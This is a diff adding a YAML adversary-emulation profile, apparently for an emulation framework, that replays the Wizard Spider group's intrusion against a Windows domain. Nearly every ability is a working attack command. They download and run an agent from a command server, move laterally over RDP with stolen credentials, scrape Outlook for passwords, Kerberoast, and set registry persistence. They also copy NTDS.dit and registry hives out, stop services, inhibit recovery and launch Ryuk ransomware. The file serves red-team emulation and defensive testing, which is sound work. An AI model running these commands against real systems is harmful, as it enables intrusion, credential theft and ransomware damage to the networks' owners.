@@ -1,0 +1,481 @@
+id: 23ee980e-f0c5-4e88-a02c-56aa862b2c76
+name: Wizard Spider
+description: Wizard Spider is a threat group considered to be a Russian-speaking cyber criminal gang associated with "big game hunting". (Emu)
+objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
+atomic_ordering:
+- 605bb8dc-f6ef-411c-ad1f-94d91bc23ee6
+- 5ca7a1b3-ff43-4057-b41f-0d8d4ecae848
+- bdf16e6e-ad27-4513-9d54-64289440265f
+- 04cf7962-28c4-40fb-8915-1fd632393a6f
+- 1a925a0f-7f95-4d5c-9f95-9408f65063a6
+- 69ce4dd6-ab00-4c63-bcfd-ab02da96c63a
+- b80ca347-2d2a-4e33-8683-1975cda6664f
+- 16abc48a-1f69-4246-83e3-4d0cec0e8d81
+- 5a5c65c7-d0ff-4275-8f8e-ea0b617369bd
+- 94942df6-6833-4e69-a6f7-89fda0ef25e1
+- 070bfb3d-6938-4745-b1e7-039c97fdb7ca
+- 1b21e49a-9550-4616-b125-d790a73165a6
+- 4750c01e-98fc-43f8-8178-14bcc66c2cc9
+- dc4236df-0484-4763-891a-c2f6ede5293d
+- 53e87d17-b904-4739-92f0-4b5169d9a1d4
+- e639caf1-8987-4aad-b6f1-6a1d186e2ec9
+- f6de05d2-5ec5-4d27-b19c-f8cf817d6213
+- aa1b8eef-2c76-4184-b7a7-2b5c175e49f6
+- 1f30fdc6-88c0-4c69-958d-6101468bd0ec
+- ed40220d-9d1f-4191-b73f-54f17278e256
+- ced2de73-54fa-49ec-b60d-de635dcde620
+- 3de63509-4171-488f-8938-ce346677a5a6
+- dedb77a9-16b9-498c-bd07-074891abd345
+- b8ad9654-80a1-4fde-b2d4-c0de7648621c
+- 6b9da996-145e-40b1-935f-6818a89bb561
+- 7a46a8c9-f46a-481b-8b38-68a3aea68114
+- 1536bbcf-858e-44c2-95cb-ebd46d7434be
+- 46430565-f9e8-4580-b497-f5f561962d95
+- 5746a074-1f51-4a96-8e69-f7eb81578f5e
+- 05202302-6b80-4549-b3bb-2ead90c249a5
+- bb98782b-2519-4721-a723-b8f027b441d4
+- d9787a1d-0fd4-4776-a073-00423a33e7e2
+- 180eb3b8-1590-4b77-9b8c-7972c198f09e
+- 69b0a93e-3c71-42f5-8019-13289d9353b3
+- 3f878fc6-d5b0-4c95-b022-88f0becbb61e
+- 06b694af-f503-44ca-bc3c-bd017f75ed89
+- cd16fcb6-e1f0-4e0f-bb83-2369516587f2
+- 95d6c92c-e328-4997-ae01-507b709dfa7b
+abilities:
+ 605bb8dc-f6ef-411c-ad1f-94d91bc23ee6:
+  name:  Upload Agent Executable to Initial Target
+  tactic:  command-and-control
+  technique_name:  "Ingress Tool Transfer"
+  technique_id:  T1105
+  executors: 
+   - sh:
+     platform: linux
+     command: |
+       server="#{server}";
+       curl -s -X POST -H "file:sandcat.go" -H "platform:windows" -H "server:$server" -H "group:dorothy" $server/file/download > ChristmasCard.exe;
+       chmod +x ChristmasCard.exe;
+       smbclient -U '#{ad.domain.name}\#{initial.user.name}' //#{initial.target.host}/C$ -c "put ./ChristmasCard.exe Users/#{initial.user.name}/Desktop\ChristmasCard.exe;" "#{initial.user.password}"
+ 5ca7a1b3-ff43-4057-b41f-0d8d4ecae848:
+  name:  RDP Connection to Initial Target (Dorothy)
+  tactic:  initial-access
+  technique_name:  "Valid Accounts"
+  technique_id:  T1078
+  executors: 
+   - proc:
+     platform: linux
+     command: |
+       exec-background xfreerdp +clipboard /u:#{ad.domain.name}\\#{initial.user.name} /p:"#{initial.user.password}" /v:#{initial.target.host} /cert-ignore
+ bdf16e6e-ad27-4513-9d54-64289440265f:
+  name:  Run Agent Executable for Initial Access
+  tactic:  execution
+  technique_name:  "User Execution: Malicious File"
+  technique_id:  T1204.002
+  executors: 
+   - sh:
+     platform: linux
+     command: |
+       sleep 30;
+       rdp_pid=$(pgrep -f "xfreerdp.*/v:#{initial.target.host}");
+       rdp_window=$(xdotool search --pid "$rdp_pid");
+       xdotool key --window "$rdp_window" Super_L;
+       sleep 5;
+       xdotool windowactivate --sync "$rdp_window" type --delay 200 "C:\Users\#{initial.user.name}\Desktop\ChristmasCard.exe";
+       sleep 3; xdotool key --window "$rdp_window" Return;
+       sleep 30;
+ 04cf7962-28c4-40fb-8915-1fd632393a6f:
+  name:  Emotet Persistence
+  tactic:  persistence
+  technique_name:  "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
+  technique_id:  T1547.001
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v blbdigital /t REG_SZ /d "%userprofile%\Ygyhlqt\Bx5jfmo\R43H.dll,Control_RunDLL"
+ 1a925a0f-7f95-4d5c-9f95-9408f65063a6:
+  name:  Emotet System Info Discovery
+  tactic:  discovery
+  technique_name:  "System Information Discovery"
+  technique_id:  T1082
+  executors: 
+   - proc:
+     platform: windows
+     command: |
+       systeminfo.exe
+ 69ce4dd6-ab00-4c63-bcfd-ab02da96c63a:
+  name:  Emotet Process Discovery
+  tactic:  discovery
+  technique_name:  "Process Discovery"
+  technique_id:  T1057
+  executors: 
+   - proc:
+     platform: windows
+     command: |
+       tasklist.exe
+ b80ca347-2d2a-4e33-8683-1975cda6664f:
+  name:  Emotet Download Outlook Scraper DLL
+  tactic:  command-and-control
+  technique_name:  "Ingress Tool Transfer"
+  technique_id:  T1105
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       move /y .\OutlookScraper.dll C:\Windows\SysWOW64\Outlook.dll
+ 16abc48a-1f69-4246-83e3-4d0cec0e8d81:
+  name:  Emotet Scrape Email Content From Outlook
+  tactic:  credential-access
+  technique_name:  "Unsecured Credentials"
+  technique_id:  T1552
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       Add-type -assembly "Microsoft.Office.Interop.Outlook" | out-null;
+       $olFolders = "Microsoft.Office.Interop.Outlook.olDefaultFolders" -as [type];
+       $outlook = new-object -comobject outlook.application;
+       $namespace = $outlook.GetNameSpace("MAPI");
+       $folder = $namespace.getDefaultFolder($olFolders::olFolderInBox);
+       ($folder.items | Select-Object -ExpandProperty Body | Select-String "password") -replace "\s+", " " -join ";";
+ 5a5c65c7-d0ff-4275-8f8e-ea0b617369bd:
+  name:  Emotet Scrape Email Addresses from Outlook
+  tactic:  collection
+  technique_name:  "Email Collection: Local Email Collection"
+  technique_id:  T1114.001
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       Add-type -assembly "Microsoft.Office.Interop.Outlook" | out-null;
+       $olFolders = "Microsoft.Office.Interop.Outlook.olDefaultFolders" -as [type];
+       $outlook = New-Object -comobject outlook.application;
+       $namespace = $outlook.GetNameSpace("MAPI");
+       $folder = $namespace.getDefaultFolder($olFolders::olFolderInBox);
+       ($folder.items | Select-Object -Unique -ExpandProperty SenderEmailAddress) -join ";";
+ 94942df6-6833-4e69-a6f7-89fda0ef25e1:
+  name:  Terminate RDP Session to Initial Target
+  tactic:  lateral-movement
+  technique_name:  "Remote Services: Remote Desktop Protocol"
+  technique_id:  T1021.001
+  executors: 
+   - proc:
+     platform: linux
+     command: |
+       pkill xfreerdp
+ 070bfb3d-6938-4745-b1e7-039c97fdb7ca:
+  name:  Lateral Movement Via RDP (Toto)
+  tactic:  lateral-movement
+  technique_name:  "Remote Services: Remote Desktop Protocol"
+  technique_id:  T1021.001
+  executors: 
+   - proc:
+     platform: linux
+     command: |
+       exec-background xfreerdp +clipboard /u:#{ad.domain.name}\\#{second_host.user.name} /p:"#{second_host.user.password}" /v:#{second.target.host} /drive:X,./ /cert-ignore
+ 1b21e49a-9550-4616-b125-d790a73165a6:
+  name:  Download and Execute Agent for Lateral Movement (Toto)
+  tactic:  command-and-control
+  technique_name:  "Ingress Tool Transfer"
+  technique_id:  T1105
+  executors: 
+   - sh:
+     platform: linux
+     command: |
+       server="#{server}";
+       curl -s -X POST -H "file:sandcat.go" -H "platform:windows" -H "server:$server" -H "group:toto" $server/file/download > TrickBotClientExe.exe;
+       chmod +x TrickBotClientExe.exe;
+       sleep 30;
+       rdp_pid=$(pgrep -f "xfreerdp.*/v:#{second.target.host}");
+       rdp_window=$(xdotool search --pid "$rdp_pid");
+       xdotool windowactivate --sync "$rdp_window" key Super_L;
+       sleep 5; xdotool windowactivate --sync "$rdp_window" type --delay 200 "cmd.exe";
+       sleep 3; xdotool windowactivate --sync "$rdp_window" key Return;
+       sleep 10; xdotool windowactivate --sync "$rdp_window" type --delay 200 'copy \\tsclient\X\TrickBotClientExe.exe %AppData%\uxtheme.exe';
+       sleep 1; xdotool windowactivate --sync "$rdp_window" key Return;
+       sleep 15; xdotool windowactivate --sync "$rdp_window" type --delay 200 "cd %AppData%";
+       sleep 1; xdotool windowactivate --sync "$rdp_window" key Return;
+       sleep 3; xdotool windowactivate --sync "$rdp_window" type --delay 200 "uxtheme.exe";
+       sleep 1; xdotool windowactivate --sync "$rdp_window" key Return;
+       sleep 30;
+ 4750c01e-98fc-43f8-8178-14bcc66c2cc9:
+  name:  TrickBot System Information Discovery
+  tactic:  discovery
+  technique_name:  "System Information Discovery"
+  technique_id:  T1082
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       systeminfo > discovery.txt
+ dc4236df-0484-4763-891a-c2f6ede5293d:
+  name:  TrickBot System Service Discovery (systeminfo)
+  tactic:  discovery
+  technique_name:  "System Service Discovery"
+  technique_id:  T1007
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       sc query >> discovery.txt
+ 53e87d17-b904-4739-92f0-4b5169d9a1d4:
+  name:  TrickBot Local Account Discovery
+  tactic:  discovery
+  technique_name:  "Account Discovery: Local Account"
+  technique_id:  T1087.001
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       net user >> discovery.txt
+ e639caf1-8987-4aad-b6f1-6a1d186e2ec9:
+  name:  TrickBot Domain Account Discovery
+  tactic:  discovery
+  technique_name:  "Account Discovery: Domain Account"
+  technique_id:  T1087.002
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       net user /domain >> discovery.txt
+ f6de05d2-5ec5-4d27-b19c-f8cf817d6213:
+  name:  TrickBot System Network Configuration Discovery
+  tactic:  discovery
+  technique_name:  "System Network Configuration Discovery"
+  technique_id:  T1016
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       ipconfig /all
+ aa1b8eef-2c76-4184-b7a7-2b5c175e49f6:
+  name:  TrickBot System Network Connections Discovery
+  tactic:  discovery
+  technique_name:  "System Network Connections Discovery"
+  technique_id:  T1049
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       netstat -tan
+ 1f30fdc6-88c0-4c69-958d-6101468bd0ec:
+  name:  TrickBot System Information Discovery (net config)
+  tactic:  discovery
+  technique_name:  "System Information Discovery"
+  technique_id:  T1082
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       net config workstation >> discovery.txt
+ ed40220d-9d1f-4191-b73f-54f17278e256:
+  name:  TrickBot Domain Trust Discovery
+  tactic:  discovery
+  technique_name:  "Domain Trust Discovery"
+  technique_id:  T1482
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       nltest /domain_trusts /all_trusts >> discovery.txt
+ ced2de73-54fa-49ec-b60d-de635dcde620:
+  name:  TrickBot Permission Groups Discovery
+  tactic:  discovery
+  technique_name:  "Permission Groups Discovery"
+  technique_id:  T1069
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       whoami /groups >> discovery.txt
+ 3de63509-4171-488f-8938-ce346677a5a6:
+  name:  TrickBot Perform Kerberoasting
+  tactic:  credential-access
+  technique_name:  "Steal or Forge Kerberos Tickets: Kerberoasting"
+  technique_id:  T1558.003
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       rubeus.exe kerberoast /domain:#{ad.domain.full_name}
+ dedb77a9-16b9-498c-bd07-074891abd345:
+  name:  Terminate RDP Session to Second Target (Toto)
+  tactic:  lateral-movement
+  technique_name:  "Remote Services: Remote Desktop Protocol"
+  technique_id:  T1021.001
+  executors: 
+   - proc:
+     platform: linux
+     command: |
+       pkill xfreerdp
+ b8ad9654-80a1-4fde-b2d4-c0de7648621c:
+  name:  Prepare Tools for Ingress Tool Transfer (Wizard)
+  tactic:  command-and-control
+  technique_name:  "Ingress Tool Transfer"
+  technique_id:  T1105
+  executors: 
+   - sh:
+     platform: linux
+     command: |
+       mkdir -p ws_tools;
+       cp kill.bat ./ws_tools/;
+       cp window.bat ./ws_tools/;
+       cp ryuk.exe ./ws_tools/;
+ 6b9da996-145e-40b1-935f-6818a89bb561:
+  name:  Lateral Movement Via RDP (Wizard)
+  tactic:  lateral-movement
+  technique_name:  "Remote Services: Remote Desktop Protocol"
+  technique_id:  T1021.001
+  executors: 
+   - proc:
+     platform: linux
+     command: |
+       exec-background xfreerdp +clipboard /u:#{ad.domain.name}\\#{domain.admin.name} /p:"#{domain.admin.password}" /v:#{dc.target.host} /drive:X,./ws_tools /cert-ignore
+ 7a46a8c9-f46a-481b-8b38-68a3aea68114:
+  name:  Download and Execute Agent for Lateral Movement (Wizard)
+  tactic:  command-and-control
+  technique_name:  "Ingress Tool Transfer"
+  technique_id:  T1105
+  executors: 
+   - sh:
+     platform: linux
+     command: |
+       sleep 30;
+       rdp_pid=$(pgrep -f "xfreerdp.*/v:#{dc.target.host}");
+       rdp_window=$(xdotool search --pid "$rdp_pid");
+       xdotool windowactivate --sync "$rdp_window" key Super_L;
+       sleep 5; xdotool windowactivate --sync "$rdp_window" type --delay 200 "powershell.exe";
+       sleep 5; xdotool windowactivate --sync "$rdp_window" key --clearmodifiers --delay 200 Control_L+Shift_L+Return;
+       sleep 10; xdotool windowactivate --sync "$rdp_window" key Left;
+       sleep 3; xdotool windowactivate --sync "$rdp_window" key Return;
+       sleep 15; xdotool windowactivate --sync "$rdp_window" type --delay 200 '$Body=@{file="sandcat.go";server="#{server}";platform="windows";group="wizard"}';
+       sleep 3; xdotool windowactivate --sync "$rdp_window" key Return;
+       sleep 3; xdotool windowactivate --sync "$rdp_window" type --delay 200 'Invoke-WebRequest -Uri #{server}/file/download -OutFile $env:AppData\uxtheme.exe -Method POST -Headers $Body';
+       sleep 3; xdotool windowactivate --sync "$rdp_window" key Return;
+       sleep 15; xdotool windowactivate --sync "$rdp_window" type --delay 200 '& $env:AppData\uxtheme.exe';
+       sleep 3; xdotool windowactivate --sync "$rdp_window" key Return;
+       sleep 30;
+ 1536bbcf-858e-44c2-95cb-ebd46d7434be:
+  name:  Wizard Spider Registry Persistence
+  tactic:  persistence
+  technique_name:  "Boot or Logon Autostart Execution: Winlogon Helper DLL"
+  technique_id:  T1547.004
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, $env:AppData\uxtheme.exe" -Force
+ 46430565-f9e8-4580-b497-f5f561962d95:
+  name:  Wizard Spider Domain Group Discovery
+  tactic:  discovery
+  technique_name:  "Permission Groups Discovery: Domain Groups"
+  technique_id:  T1069.002
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       adfind -f "(objectcategory=group)"
+ 5746a074-1f51-4a96-8e69-f7eb81578f5e:
+  name:  Wizard Spider Create Volume Shadow Copy
+  tactic:  credential-access
+  technique_name:  "OS Credential Dumping: NTDS"
+  technique_id:  T1003.003
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       cmd /c "vssadmin.exe create shadow /for=C:";
+ 05202302-6b80-4549-b3bb-2ead90c249a5:
+  name:  Wizard Spider Exfil Volume Shadow Copy
+  tactic:  credential-access
+  technique_name:  "OS Credential Dumping: NTDS"
+  technique_id:  T1003.003
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       cmd /c "copy #{vssadmin.shadow_copy.name}\Windows\NTDS\NTDS.dit \\TSCLIENT\X\ntds.dit";
+       cmd /c "copy #{vssadmin.shadow_copy.name}\Windows\System32\config\SYSTEM \\TSCLIENT\X\VSC_SYSTEM_HIVE";
+ bb98782b-2519-4721-a723-b8f027b441d4:
+  name:  Wizard Spider Save Registry Hive
+  tactic:  credential-access
+  technique_name:  "OS Credential Dumping: Security Account Manager"
+  technique_id:  T1003.002
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       cmd /c "reg SAVE HKLM\SYSTEM \\TSCLIENT\X\SYSTEM_HIVE"
+ d9787a1d-0fd4-4776-a073-00423a33e7e2:
+  name:  Wizard Spider Downloads kill.bat
+  tactic:  command-and-control
+  technique_name:  "Ingress Tool Transfer"
+  technique_id:  T1105
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       cmd /c "net use Z: \\#{second.target.host}\C$";
+       cmd /c "copy \\TSCLIENT\X\kill.bat C:\Users\Public\kill.bat";
+ 180eb3b8-1590-4b77-9b8c-7972c198f09e:
+  name:  Wizard Spider Runs kill.bat
+  tactic:  impact
+  technique_name:  "Service Stop"
+  technique_id:  T1489
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       cmd /c "C:\Users\Public\kill.bat" 2> $null;
+       exit 0;
+ 69b0a93e-3c71-42f5-8019-13289d9353b3:
+  name:  Wizard Spider Downloads window.bat
+  tactic:  command-and-control
+  technique_name:  "Ingress Tool Transfer"
+  technique_id:  T1105
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       cmd /c "copy \\TSCLIENT\X\window.bat C:\Users\Public\window.bat"
+ 3f878fc6-d5b0-4c95-b022-88f0becbb61e:
+  name:  Wizard Spider Runs window.bat
+  tactic:  impact
+  technique_name:  "Inhibit System Recovery"
+  technique_id:  T1490
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       cmd /c "C:\Users\Public\window.bat" 2> $null;
+       exit 0;
+ 06b694af-f503-44ca-bc3c-bd017f75ed89:
+  name:  Wizard Spider Downloads ryuk.exe
+  tactic:  command-and-control
+  technique_name:  "Ingress Tool Transfer"
+  technique_id:  T1105
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       cmd /c "copy \\TSCLIENT\X\ryuk.exe C:\Users\Public\ryuk.exe"
+ cd16fcb6-e1f0-4e0f-bb83-2369516587f2:
+  name:  Wizard Spider Executes Ryuk Ransomware
+  tactic:  command-and-control
+  technique_name:  "Data Encrypted for Impact"
+  technique_id:  T1486
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       Start-Process C:\Windows\System32\notepad.exe;
+       cmd /c "C:\Users\Public\ryuk.exe --encrypt --process-name notepad.exe";
+ 95d6c92c-e328-4997-ae01-507b709dfa7b:
+  name:  Terminate RDP Session to Domain Controller
+  tactic:  lateral-movement
+  technique_name:  "Remote Services: Remote Desktop Protocol"
+  technique_id:  T1021.001
+  executors: 
+   - proc:
+     platform: linux
+     command: |
+       pkill xfreerdp
